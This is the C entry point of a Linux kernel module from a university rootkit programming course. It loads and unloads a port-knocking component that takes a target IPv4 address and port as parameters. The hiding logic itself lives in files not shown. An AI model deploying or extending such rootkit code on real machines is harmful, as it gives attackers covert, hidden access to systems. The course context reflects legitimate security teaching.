/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>
#include <linux/inet.h>

#include "port_knocking.h"
#include "include.h"

/*
 * module parameters  
 * IP address and port number
 */
static char input_ip[16]; 
module_param_string(ipv4, input_ip, 16, 0);
static int port_number;
module_param(port_number, int, 0);
/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	u8 dst[4];
	int ret;

	ROOTKIT_DEBUG("Loading port-knocker LKM...\n");
	
	/* ensure the input is ipv4 address */
	ret = in4_pton(input_ip, -1, dst, -1, NULL); // Use the same function for convert into integer
	
	if(ret == 0 || port_number<0 || port_number>65535)
	{
		ROOTKIT_DEBUG("Invalid IP-address or port number. Please enter data.\n");
		return -EINVAL;
	}
	
	load_port_knocking(input_ip, (unsigned)port_number);
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	unload_port_knocking();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Unloading port-knocker... bye!\n");
}
